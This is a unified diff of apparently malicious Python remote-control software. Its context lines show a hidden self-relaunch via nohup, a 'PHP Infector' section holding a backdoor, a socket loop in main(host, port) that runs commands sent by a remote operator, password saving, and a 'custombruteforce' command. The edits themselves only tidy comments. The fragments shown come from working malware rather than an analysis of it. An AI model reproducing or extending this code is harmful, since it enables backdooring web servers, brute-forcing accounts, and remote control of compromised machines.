@@ -81,9 +81,8 @@ def selfUpdate():
     f.close()
 
     os.system("nohup python3 %s > /dev/null 2>&1 &" % (filename))
-#<--
 
-#PHP Infector-->
+# PHP Infector
 backdoor = """
 <?php
 
@@ -394,7 +393,6 @@ def rmbackdoor(thedir):
                 f = open(thefile, "w")
                 f.write(inside)
                 f.close()
-#<--
 
 def savePass(password):
     f = open("password.txt", "w")
@@ -525,7 +523,7 @@ def main(host, port):
                 msg=s.recv(20480).decode()
                 print(msg)
                 allofem = msg.split(";")
-                for onebyone in allofem: #This your happy day one liners
+                for onebyone in allofem:
                     commands = onebyone.split( )
                     if (commands[0] == "cd"):
                         os.chdir(commands[1])
@@ -611,7 +609,6 @@ def main(host, port):
                     elif (commands[0] == "custombruteforce"):
                         try:
                             bruteinfo = commands[1].split(":")
-# address, port, email, combination, minimum, maximum = msg.split(":")
                             t = Thread(None,custombruteforce,None,
                                        (bruteinfo[0], bruteinfo[1],
                                         bruteinfo[2], bruteinfo[3],
